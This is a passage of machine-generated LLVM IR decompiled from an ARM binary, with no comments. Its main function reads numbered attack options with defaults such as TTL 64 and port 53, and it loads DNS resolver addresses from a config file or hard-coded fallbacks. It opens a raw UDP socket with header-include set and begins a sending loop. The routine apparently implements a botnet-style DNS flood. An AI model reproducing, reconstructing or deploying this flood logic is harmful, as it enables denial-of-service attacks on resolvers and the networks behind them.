  %v4_dc1c = inttoptr i32 %v3_dc1c to i8*
  store i8 %v1_dc1c, i8* %v4_dc1c, align 1
  store i32 %v3_d8fc, i32* %r3.global-to-local, align 4
  %v1_dc24 = load i32, i32* %r7.global-to-local, align 4
  %v9_dc24 = icmp eq i32 %v3_d8fc, %v1_dc24
  store i1 %v9_dc24, i1* %cpsr_z.global-to-local, align 1
  %v3_dc28 = load i32, i32* @r5, align 4
  %v4_dc28 = add i32 %v3_dc28, 4
  %v5_dc28 = inttoptr i32 %v4_dc28 to i8*
  store i8 %v1_dc14, i8* %v5_dc28, align 1
  %v0_dc2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dc2c, label %dec_label_pc_dc30, label %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge

dec_label_pc_dc14.dec_label_pc_dae4_crit_edge:    ; preds = %dec_label_pc_dc14
  %v1_dae8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dae4

dec_label_pc_dc30:                                ; preds = %dec_label_pc_dc14, %dec_label_pc_dad8
  %v0_dc30 = call i32 @function_fe24()
  %v1_dc30 = trunc i32 %v0_dc30 to i8
  %v4_dc38 = sdiv i32 %v0_dc30, 256
  store i32 %v4_dc38, i32* %r3.global-to-local, align 4
  %v1_dc3c = load i32, i32* %r7.global-to-local, align 4
  %v9_dc3c = icmp eq i32 %v3_d900, %v1_dc3c
  store i1 %v9_dc3c, i1* %cpsr_z.global-to-local, align 1
  %v3_dc40 = load i32, i32* @r5, align 4
  %v4_dc40 = add i32 %v3_dc40, 20
  %v5_dc40 = inttoptr i32 %v4_dc40 to i8*
  store i8 %v1_dc30, i8* %v5_dc40, align 1
  %v0_dc44 = load i32, i32* %r3.global-to-local, align 4
  %v1_dc44 = trunc i32 %v0_dc44 to i8
  %v2_dc44 = load i32, i32* @r6, align 4
  %v3_dc44 = add i32 %v2_dc44, 1
  %v4_dc44 = inttoptr i32 %v3_dc44 to i8*
  store i8 %v1_dc44, i8* %v4_dc44, align 1
  %v0_dc48 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dc48, label %dec_label_pc_dc4c, label %dec_label_pc_daf0

dec_label_pc_dc4c:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_dae4
  %v0_dc4c = call i32 @function_fe24()
  %v1_dc4c = trunc i32 %v0_dc4c to i8
  %v4_dc50 = sdiv i32 %v0_dc4c, 256
  store i32 %v4_dc50, i32* %r3.global-to-local, align 4
  %v1_dc54 = trunc i32 %v4_dc50 to i8
  %v2_dc54 = load i32, i32* @r6, align 4
  %v3_dc54 = add i32 %v2_dc54, 3
  %v4_dc54 = inttoptr i32 %v3_dc54 to i8*
  store i8 %v1_dc54, i8* %v4_dc54, align 1
  %v3_dc58 = load i32, i32* @r6, align 4
  %v4_dc58 = add i32 %v3_dc58, 2
  %v5_dc58 = inttoptr i32 %v4_dc58 to i8*
  store i8 %v1_dc4c, i8* %v5_dc58, align 1
  br label %dec_label_pc_daf0

dec_label_pc_dc60:                                ; preds = %dec_label_pc_d8c0
  %v0_dc60 = load i32, i32* %fp.global-to-local, align 4
  %v1_dc64 = call i32 @function_12e9c(i32 %v0_dc60)
  br label %dec_label_pc_dc68

dec_label_pc_dc68:                                ; preds = %dec_label_pc_d7b0, %dec_label_pc_dc60
  %v29_dc6c = phi i32 [ %v3_d8b0, %dec_label_pc_d7b0 ], [ %v1_dc64, %dec_label_pc_dc60 ]
  store i32 %v3_d7b0, i32* %r4.global-to-local, align 4
  store i32 %v12_d7b0, i32* %r7.global-to-local, align 4
  ret i32 %v29_dc6c

; uselistorder directives
  uselistorder i32 %v4_dc50, { 1, 0 }
  uselistorder i32 %v2_dc04, { 1, 0 }
  uselistorder i32 %v0_dbc0, { 1, 0, 2 }
  uselistorder i1 %v2_dba0, { 1, 0 }
  uselistorder i32 %v1_db94, { 1, 2, 3, 0 }
  uselistorder i32 %v1_db90, { 2, 0, 3, 1 }
  uselistorder i32 %v3_db58, { 1, 0 }
  uselistorder i32 %v4_db04, { 1, 0 }
  uselistorder i32 %v1_da78, { 1, 0, 2, 3 }
  uselistorder i32 %v1_da1c, { 1, 0 }
  uselistorder i32 %v1_d9a4, { 1, 0 }
  uselistorder i32 %v1_d92c, { 1, 0 }
  uselistorder i32 %v1_d920, { 1, 0 }
  uselistorder i32 %v3_d8f8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_d8f0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_d8e8, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_d8e0, { 1, 0 }
  uselistorder i1 %v7_d8b4, { 1, 0 }
  uselistorder i32 %v3_d8b0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d850, { 1, 0 }
  uselistorder i8 %v5_d840, { 1, 0 }
  uselistorder i32 %v5_d824, { 1, 0 }
  uselistorder i32 %v6_d7e8, { 1, 0 }
  uselistorder i32 %v1_d7b4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_dc68, { 1, 0 }
  uselistorder label %dec_label_pc_daf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_da90, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_dc74(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dc74:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_dc74 = load i32, i32* @r4, align 4
  %v15_dc74 = load i32, i32* @r8, align 4
  %v18_dc74 = load i32, i32* @sb, align 4
  %v21_dc74 = load i32, i32* @sl, align 4
  %v24_dc74 = load i32, i32* @fp, align 4
  %v1_dc80 = urem i32 %arg1, 256
  store i32 %v1_dc80, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_dc8c = urem i32 %arg3, 256
  store i32 %v1_dc8c, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_dc98 = call i32 @function_13a94(i32 %v1_dc80, i32 4)
  %v0_dc9c = load i32, i32* @r5, align 4
  store i32 %v0_dc9c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_dca8 = load i32, i32* @r4, align 4
  store i32 %v0_dca8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_dcb0 = inttoptr i32 %v0_dc9c to i32*
  %v6_dcb0 = call i32 @function_a4e8(i32 %v0_dca8, i32* %v5_dcb0, i32 2, i32 0)
  %v1_dcbc = urem i32 %v6_dcb0, 256
  store i32 %v1_dcbc, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_dcc8 = load i32, i32* @r4, align 4
  store i32 %v0_dcc8, i32* %r0.global-to-local, align 4
  %v0_dccc = load i32, i32* @r5, align 4
  store i32 %v0_dccc, i32* %r1.global-to-local, align 4
  %v5_dcd0 = trunc i32 %v6_dcb0 to i8
  %v6_dcd4 = inttoptr i32 %v0_dccc to i32*
  %v7_dcd4 = call i32 @function_a4e8(i32 %v0_dcc8, i32* %v6_dcd4, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_dcd8 = load i32, i32* @r5, align 4
  store i32 %v0_dcd8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_dce4 = load i32, i32* @r4, align 4
  store i32 %v0_dce4, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_dcec = inttoptr i32 %v0_dcd8 to i32*
  %v6_dcec = call i32 @function_a4e8(i32 %v0_dce4, i32* %v5_dcec, i32 4, i32 64)
  %v1_dcf4 = urem i32 %v6_dcec, 256
  store i32 %v1_dcf4, i32* %ip.global-to-local, align 4
  %v0_dcf8 = load i32, i32* @r5, align 4
  store i32 %v0_dcf8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dd04 = load i32, i32* @r4, align 4
  store i32 %v0_dd04, i32* %r0.global-to-local, align 4
  %v6_dd0c = inttoptr i32 %v0_dcf8 to i32*
  %v7_dd0c = call i32 @function_a4e8(i32 %v0_dd04, i32* %v6_dd0c, i32 5, i32 0)
  %v1_dd18 = urem i32 %v7_dd0c, 256
  store i32 %v1_dd18, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_dd24 = load i32, i32* @r4, align 4
  store i32 %v0_dd24, i32* %r0.global-to-local, align 4
  %v0_dd28 = load i32, i32* @r5, align 4
  store i32 %v0_dd28, i32* %r1.global-to-local, align 4
  %v5_dd30 = inttoptr i32 %v0_dd28 to i32*
  %v6_dd30 = call i32 @function_a4e8(i32 %v0_dd24, i32* %v5_dd30, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_dd34 = load i32, i32* @r5, align 4
  store i32 %v0_dd34, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_dd30, i32* %fp.global-to-local, align 4
  %v0_dd44 = load i32, i32* @r4, align 4
  store i32 %v0_dd44, i32* %r0.global-to-local, align 4
  %v4_dd48 = inttoptr i32 %v0_dd34 to i32*
  %v5_dd48 = call i32 @function_a4e8(i32 %v0_dd44, i32* %v4_dd48, i32 7, i32 53)
  %v0_dd50 = load i32, i32* @r5, align 4
  store i32 %v0_dd50, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_dd48, i32* %sb.global-to-local, align 4
  %v0_dd60 = load i32, i32* @r4, align 4
  store i32 %v0_dd60, i32* %r0.global-to-local, align 4
  %v4_dd64 = inttoptr i32 %v0_dd50 to i32*
  %v5_dd64 = call i32 @function_a4e8(i32 %v0_dd60, i32* %v4_dd64, i32 9, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_dd68 = load i32, i32* @r5, align 4
  store i32 %v0_dd68, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_dd64, i32* @sl, align 4
  %v0_dd78 = load i32, i32* @r4, align 4
  store i32 %v0_dd78, i32* %r0.global-to-local, align 4
  %v4_dd7c = inttoptr i32 %v0_dd68 to i32*
  %v5_dd7c = call i32 @function_a4e8(i32 %v0_dd78, i32* %v4_dd7c, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_dd88 = load i32, i32* @r5, align 4
  store i32 %v0_dd88, i32* %r1.global-to-local, align 4
  store i32 %v5_dd7c, i32* %r8.global-to-local, align 4
  %v0_dd90 = load i32, i32* @r4, align 4
  store i32 %v0_dd90, i32* %r0.global-to-local, align 4
  %v5_dd94 = inttoptr i32 %v0_dd88 to i32*
  %v6_dd94 = call i32 @function_9f84(i32 %v0_dd90, i32* %v5_dd94, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_dda0 = call i32 @function_11c08(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_ddac = call i32 @function_11b24(i32 30, i32* null)
  store i32 %v3_ddac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_ddb4 = inttoptr i32 %v3_ddac to i8*
  %v3_ddb4 = call i32 @function_12fc8(i8* %v2_ddb4, i32 0)
  store i32 %v3_ddb4, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_ddc0 = call i32 @function_11b50(i32 30)
  store i32 %v1_ddc0, i32* %r0.global-to-local, align 4
  %v0_ddc4 = load i32, i32* @r4, align 4
  %v1_ddc4 = icmp slt i32 %v0_ddc4, 0
  %v2_ddc4 = icmp eq i32 %v0_ddc4, 0
  store i1 %v2_ddc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_ddc4, label %dec_label_pc_e390, label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_dc74
  %v2_ddd0 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_ddd0, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_ddd0, i32* %r1.global-to-local, align 4
  store i32 %v0_ddc4, i32* %r0.global-to-local, align 4
  %v4_dde0 = call i32 @function_13064(i32 %v0_ddc4, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_dde0, i32* @r5, align 4
  %v0_dde8 = load i32, i32* @r4, align 4
  store i32 %v0_dde8, i32* %r0.global-to-local, align 4
  %v1_ddec = call i32 @function_12e9c(i32 %v0_dde8)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_ddf4 = call i32 @function_11c08(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_de00 = call i32 @function_11b24(i32 31, i32* null)
  %v0_de04 = load i32, i32* @r5, align 4
  store i32 %v0_de04, i32* @r1, align 4
  store i32 %v3_de00, i32* %r2.global-to-local, align 4
  store i32 %v2_ddd0, i32* %r0.global-to-local, align 4
  %v3_de10 = bitcast i32* %stack_var_-2120 to i8*
  %v4_de10 = call i32 @function_12830(i8* %v3_de10, i32 %v0_de04, i32 %v3_de00)
  store i32 %v4_de10, i32* @r4, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_de1c = call i32 @function_11b50(i32 31)
  store i32 %v1_de1c, i32* %r0.global-to-local, align 4
  %v0_de20 = load i32, i32* @r4, align 4
  %v7_de20 = icmp eq i32 %v0_de20, -1
  store i1 %v7_de20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de20, label %dec_label_pc_e390, label %dec_label_pc_de28

dec_label_pc_de28:                                ; preds = %dec_label_pc_ddcc
  %v0_de28 = load i32, i32* @r5, align 4
  %v9_de28 = icmp eq i32 %v0_de28, %v0_de20
  store i1 %v9_de28, i1* %cpsr_z.global-to-local, align 1
  %v7_de2c = icmp sgt i32 %v0_de28, %v0_de20
  br i1 %v7_de2c, label %dec_label_pc_de30, label %dec_label_pc_e390

dec_label_pc_de30:                                ; preds = %dec_label_pc_de28
  store i32 %v0_de28, i32* %r3.global-to-local, align 4
  store i32 %v0_de20, i32* %r2.global-to-local, align 4
  %v0_de40 = load i32, i32* @r6, align 4
  %v2_de40 = add i32 %v0_de40, %v0_de20
  store i32 %v2_de40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_de48 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_de48, i32* @r7, align 4
  %v1_de78 = add i32 %v0_de28, -1
  br label %dec_label_pc_de70

dec_label_pc_de54:                                ; preds = %dec_label_pc_de98, %bb138
  %v9_de54 = icmp eq i32 %v0_de60, %v1_de78
  store i1 %v9_de54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_de54, label %dec_label_pc_dea4, label %dec_label_pc_de5c

dec_label_pc_de5c:                                ; preds = %dec_label_pc_de88, %dec_label_pc_de54, %bb
  %v0_de9442 = phi i32 [ %v0_de94, %dec_label_pc_de88 ], [ %v0_de9443, %dec_label_pc_de54 ], [ %v0_de94, %bb ]
  %v0_de7438 = phi i32 [ 0, %dec_label_pc_de88 ], [ %v0_de7439, %dec_label_pc_de54 ], [ 0, %bb ]
  store i32 %v0_de28, i32* %r0.global-to-local, align 4
  %v1_de60 = add i32 %v0_de60, 1
  store i32 %v1_de60, i32* %r2.global-to-local, align 4
  %v9_de64 = icmp eq i32 %v0_de28, %v1_de60
  store i1 %v9_de64, i1* %cpsr_z.global-to-local, align 1
  %v1_de68 = add i32 %v0_de68, 1
  store i32 %v1_de68, i32* @r7, align 4
  br i1 %v9_de64, label %dec_label_pc_e390, label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %dec_label_pc_de5c, %dec_label_pc_de30
  %v0_de68 = phi i32 [ %v1_de68, %dec_label_pc_de5c ], [ %v2_de48, %dec_label_pc_de30 ]
  %v0_de60 = phi i32 [ %v1_de60, %dec_label_pc_de5c ], [ %v0_de20, %dec_label_pc_de30 ]
  %v0_de94 = phi i32 [ %v0_de9442, %dec_label_pc_de5c ], [ 0, %dec_label_pc_de30 ]
  %v0_de74 = phi i32 [ %v0_de7438, %dec_label_pc_de5c ], [ 0, %dec_label_pc_de30 ]
  %v0_de7c = phi i32 [ %v1_de7c, %dec_label_pc_de5c ], [ %v2_de40, %dec_label_pc_de30 ]
  %v1_de70 = inttoptr i32 %v0_de7c to i8*
  %v2_de70 = load i8, i8* %v1_de70, align 1
  %v3_de70 = zext i8 %v2_de70 to i32
  store i32 %v3_de70, i32* %r3.global-to-local, align 4
  %v2_de74 = icmp eq i32 %v0_de74, 0
  store i1 %v2_de74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_de78, i32* %ip.global-to-local, align 4
  %v1_de7c = add i32 %v0_de7c, 1
  store i32 %v1_de7c, i32* %r1.global-to-local, align 4
  %v1_de80 = add nsw i32 %v3_de70, -48
  store i32 %v1_de80, i32* %r0.global-to-local, align 4
  br i1 %v2_de74, label %dec_label_pc_de88, label %dec_label_pc_de98

dec_label_pc_de88:                                ; preds = %dec_label_pc_de70
  %v7_de88 = icmp eq i8 %v2_de70, 9
  store i1 %v7_de88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de88, label %dec_label_pc_de5c, label %bb

bb:                                               ; preds = %dec_label_pc_de88
  %v8_de8c = icmp eq i8 %v2_de70, 32
  store i1 %v8_de8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_de8c, label %dec_label_pc_de5c, label %dec_label_pc_de94

dec_label_pc_de94:                                ; preds = %bb
  %v1_de94 = add i32 %v0_de94, 1
  store i32 %v1_de94, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_de98

dec_label_pc_de98:                                ; preds = %dec_label_pc_de70, %dec_label_pc_de94
  %v0_de9443 = phi i32 [ %v0_de94, %dec_label_pc_de70 ], [ %v1_de94, %dec_label_pc_de94 ]
  %v0_de7439 = phi i32 [ %v0_de74, %dec_label_pc_de70 ], [ %v1_de94, %dec_label_pc_de94 ]
  %v7_de98 = icmp eq i8 %v2_de70, 46
  store i1 %v7_de98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_de98, label %dec_label_pc_de54, label %bb138

bb138:                                            ; preds = %dec_label_pc_de98
  %v8_de9c = icmp eq i32 %v1_de80, 9
  store i1 %v8_de9c, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_de80, 10
  br i1 %tmp, label %dec_label_pc_de54, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de54, %bb138
  %v0_de60.lcssa = phi i32 [ %v1_de78, %dec_label_pc_de54 ], [ %v0_de60, %bb138 ]
  %v2_dea8 = sub i32 %v0_de60.lcssa, %v0_de20
  store i32 %v2_dea8, i32* %r2.global-to-local, align 4
  store i32 %v2_de40, i32* %r1.global-to-local, align 4
  store i32 %v2_de48, i32* %r0.global-to-local, align 4
  %v3_deb4 = call i32 @function_12558(i32 %v2_de48, i32 %v2_de40, i32 %v2_dea8)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_de48, i32* @r0, align 4
  %v2_dec4 = load i32, i32* @r7, align 4
  %v3_dec4 = inttoptr i32 %v2_dec4 to i8*
  store i8 0, i8* %v3_dec4, align 1
  %v1_dec8 = call i32 @function_13570(i32 %v2_de48)
  store i32 %v1_dec8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_ded020:                              ; preds = %dec_label_pc_e390
  unreachable

dec_label_pc_ded0:                                ; preds = %dec_label_pc_e408, %dec_label_pc_e3f8, %dec_label_pc_e3ec, %dec_label_pc_e3d8, %dec_label_pc_dea4
  %v29_e3d474 = phi i32 [ %v1_e394, %dec_label_pc_e408 ], [ %v1_e394, %dec_label_pc_e3f8 ], [ %v1_e394, %dec_label_pc_e3ec ], [ %v1_e394, %dec_label_pc_e3d8 ], [ %v1_dec8, %dec_label_pc_dea4 ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_e408 ], [ 104859200, %dec_label_pc_e3f8 ], [ 707416650, %dec_label_pc_e3ec ], [ 134744072, %dec_label_pc_e3d8 ], [ %v1_dec8, %dec_label_pc_dea4 ]
  store i32 %v6_dd94, i32* %ip.global-to-local, align 4
  %v2_ded4 = icmp eq i32 %v6_dd94, 0
  store i1 %v2_ded4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ded4, label %dec_label_pc_e3cc, label %dec_label_pc_dedc

dec_label_pc_dedc:                                ; preds = %dec_label_pc_ded0
  store i32 %v6_dd94, i32* %r0.global-to-local, align 4
  %v1_dee0 = inttoptr i32 %v6_dd94 to i8*
  %v2_dee0 = call i32 @function_124dc(i8* %v1_dee0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_def4 = call i32 @function_13790(i32 2, i32 3, i32 17)
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v7_def8 = icmp eq i32 %v3_def4, -1
  store i1 %v7_def8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_def8, label %dec_label_pc_e3cc, label %dec_label_pc_df04

dec_label_pc_df04:                                ; preds = %dec_label_pc_dedc
  store i32 1, i32* %stack_var_-40, align 4
  %v6_df10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_df10, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_df24 = call i32 @function_13760(i32 %v3_def4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_df24, i32* %r0.global-to-local, align 4
  %v7_df28 = icmp eq i32 %v6_df24, -1
  store i1 %v7_df28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_df28, label %dec_label_pc_e3c4, label %dec_label_pc_df30

dec_label_pc_df30:                                ; preds = %dec_label_pc_df04
  store i32 %v1_dc80, i32* %r0.global-to-local, align 4
  %v3_df38 = mul i32 %v7_dcd4, 65536
  store i32 %v3_df38, i32* %lr.global-to-local, align 4
  %v0_df3c = load i32, i32* @sl, align 4
  %v3_df3c = mul i32 %v0_df3c, 65536
  store i32 %v3_df3c, i32* %sl.global-to-local, align 4
  %v0_df40 = load i32, i32* %r8.global-to-local, align 4
  %v0_df44 = load i32, i32* %fp.global-to-local, align 4
  %v0_df48 = load i32, i32* %sb.global-to-local, align 4
  %v3_df48 = mul i32 %v0_df48, 65536
  store i32 %v3_df48, i32* %sb.global-to-local, align 4
  %v5_df4c = trunc i32 %v0_df40 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_df54 = urem i32 %v7_dcd4, 65536
  store i32 %v3_df54, i32* %r2.global-to-local, align 4
  %v3_df58 = urem i32 %v0_df44, 65536
  store i32 %v3_df58, i32* %r3.global-to-local, align 4
  %v3_df5c = urem i32 %v0_df48, 65536
  store i32 %v3_df5c, i32* %r4.global-to-local, align 4
  %v3_df60 = urem i32 %v0_df3c, 65536
  store i32 %v3_df60, i32* %r8.global-to-local, align 4
  %v2_df64 = icmp eq i32 %v1_dc80, 0
  store i1 %v2_df64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_df64, label %dec_label_pc_e3b4, label %dec_label_pc_df88

dec_label_pc_df88:                                ; preds = %dec_label_pc_df30
  %v4_df8c = sext i8 %v5_df4c to i32
  %v2_df90 = add i32 %v4_df8c, %v2_dee0
  store i32 %v2_df90, i32* @fp, align 4
  %v3_df94 = mul i32 %v2_df90, 65536
  %v1_df98 = add i32 %v3_df94, 1769472
  store i32 %v1_df98, i32* @r6, align 4
  %v1_df9c = add i32 %v3_df94, 3080192
  %v1_dfb0 = urem i32 %v0_df3c, 256
  %v3_dfc0 = udiv i32 %v1_df98, 256
  %v1_dfc4 = urem i32 %v7_dcd4, 256
  %v1_dfc8 = and i32 %v3_dfc0, 65280
  %v1_dfcc = urem i32 %v0_df48, 256
  %v3_dfd0 = mul nuw nsw i32 %v1_dfb0, 256
  %v1_dfd8 = urem i32 %v0_df44, 256
  %v3_dfdc = mul nuw nsw i32 %v1_dfcc, 256
  %tmp139 = udiv i32 %v0_df3c, 256
  %v4_dfe0 = urem i32 %tmp139, 256
  %v5_dfe0 = or i32 %v4_dfe0, %v3_dfd0
  store i32 %v5_dfe0, i32* %r8.global-to-local, align 4
  %v4_dfe4 = udiv i32 %v1_df98, 16777216
  %v5_dfe4 = or i32 %v1_dfc8, %v4_dfe4
  store i32 %v5_dfe4, i32* %sl.global-to-local, align 4
  %tmp140 = udiv i32 %v0_df44, 256
  %v3_dff0 = urem i32 %tmp140, 256
  %v4_dff4 = sdiv i32 %v1_df9c, 16777216
  %tmp141 = udiv i32 %v7_dcd4, 256
  %v4_dffc = mul nuw nsw i32 %v1_dfd8, 256
  %v5_dffc = or i32 %v4_dffc, %v3_dff0
  store i32 %v5_dffc, i32* @r5, align 4
  %tmp142 = udiv i32 %v0_df48, 256
  %v4_e000 = urem i32 %tmp142, 256
  %v5_e000 = or i32 %v4_e000, %v3_dfdc
  store i32 %v5_e000, i32* %sb.global-to-local, align 4
  store i32 %v1_dfc4, i32* %r0.global-to-local, align 4
  %v1_e00c = add i32 %v2_dee0, 1
  store i32 %v1_e00c, i32* @r7, align 4
  %v3_e010 = ashr i32 %v1_df9c, 31
  store i32 %v3_e010, i32* @lr, align 4
  store i32 %v1_dfd8, i32* %r1.global-to-local, align 4
  store i32 %v1_dfcc, i32* %r2.global-to-local, align 4
  %v3_e01c75 = udiv i32 %v1_dfc8, 256
  store i32 %v3_e01c75, i32* %r3.global-to-local, align 4
  store i32 %v1_dfb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_e080 = sext i8 %v5_dcd0 to i32
  %sext13 = mul i32 %v6_dcec, 16777216
  %v4_e098 = sdiv i32 %sext13, 16777216
  %sext14 = mul i32 %tmp141, 16777216
  %v4_e0ac = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %v7_dcd4, 16777216
  %v4_e0b0 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v1_df98, 256
  %v4_e0e0 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v0_df48, 16777216
  %v4_e0e4 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_df44, 16777216
  %v4_e108 = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_df3c, 16777216
  %v4_e114 = sdiv i32 %sext19, 16777216
  %v1_e090 = trunc i32 %v4_dff4 to i8
  %extract.t = trunc i32 %v3_e010 to i8
  br label %dec_label_pc_e040

dec_label_pc_e040:                                ; preds = %dec_label_pc_e1a8, %dec_label_pc_df88
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_e048 = call i32 @function_13a94(i32 600, i32 1)
  store i32 %v2_e048, i32* %r0.global-to-local, align 4
  store i32 %v2_dc98, i32* %lr.global-to-local, align 4
  %v3_e050 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e050, i32* %r3.global-to-local, align 4
  %v2_e054 = load i32, i32* @r4, align 4
